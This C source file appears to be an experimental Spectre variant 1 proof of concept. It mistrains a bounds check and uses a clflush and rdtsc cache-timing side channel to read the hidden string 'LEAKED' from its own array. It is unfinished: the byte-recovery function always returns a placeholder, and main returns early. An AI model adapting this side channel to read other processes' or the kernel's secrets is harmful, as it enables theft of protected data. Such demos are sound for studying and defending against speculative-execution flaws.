#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>

#define PAGE_SZ 128
#define NBS 100
#define LEAK_SZ 16

volatile char to_leak[LEAK_SZ + 6] = 
"\0\0\0\0" "\0\0\0\0" 
"\0\0\0\0" "\0\0\0\0" 
"LEAKED";
volatile uint8_t buffer[256 * PAGE_SZ];

volatile uint32_t sz_buff = PAGE_SZ * 256;
volatile uint32_t sz_guard = LEAK_SZ;


// Do nothing
void sink(uint32_t x){
	(void) x;
}

// Waiting ( to avoid sleep )
void delay(){
	uint32_t x = 0x1234;
	for(int i = 0; i < 1000; i++){
		x <<= i;
		x *= i;
		x ^= 123;
	}
}

int x;
void guard_size(int idx){
	if(idx <= sz_guard){
		x = x ^ buffer[to_leak[idx] * PAGE_SZ];
	}
}

#define TRAIN 100
#define FREQ 10

uint32_t check(int idx, int val_to_check){
	// Flushing from cache
	for(int i = 0; i < 256; i++){
		_mm_clflush((void *) (buffer + i * PAGE_SZ));
	}
	// Waiting the flush
	//delay(); // _mm__fence maybe ?
	
	for(int i = 0; i < TRAIN; i++){
		_mm_clflush((void *)&sz_guard);
		delay();
		delay();
		int trx = i % sz_guard;
		int addr = ((i % FREQ) - 1) & ~0xffff;
		addr = (addr | (addr >> 16));  // 00000 ... fffff
		addr = trx ^ (addr & (trx ^ idx));
		//printf("%d %d\n",i,addr);
		guard_size(addr);
	}

	//_mm_lfence();
	delay();
	
	uint64_t a,b;
	val_to_check *= PAGE_SZ;
	a = __rdtsc();
	sink(buffer[val_to_check]);
	_mm_lfence();
	b = __rdtsc();

	return (uint32_t) (b-a);
}


uint32_t check_avg(int idx, int val_to_check){
	uint32_t is_ram = 0;
	uint32_t is_cache = 0;
	for(int i = 0; i < NBS; i++){
		uint32_t tm = check(idx, val_to_check);
		if(tm > 80){
			is_ram++;
		}else{
			is_cache++;
		}
	}
	printf(" %d %d -- ", is_ram, is_cache);
	if(is_cache > is_ram){
		return 1;
	}
	return 0;
}


uint8_t get_byte(int idx){
	uint8_t ch = 'f';
	for(int c = 'A'; c <= 'Z'; c++){
		printf("%c : %d\n",c, check_avg(idx,c));
	}
	return ch;
}

int main(){
	
	printf("%c\n",get_byte(sz_guard));
	return 0;
	for(int i = 0; i < 6; i++){
		printf("%c",get_byte(sz_guard + i));
	}
	
	return 0;
}



